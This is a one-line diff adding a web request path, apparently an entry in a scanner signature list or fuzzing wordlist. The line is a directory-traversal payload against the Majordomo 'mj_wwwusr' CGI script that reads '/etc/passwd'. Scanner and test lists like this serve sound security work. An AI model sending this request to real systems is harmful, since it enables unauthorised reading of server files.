@@ -1,0 +1,1 @@
+/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd
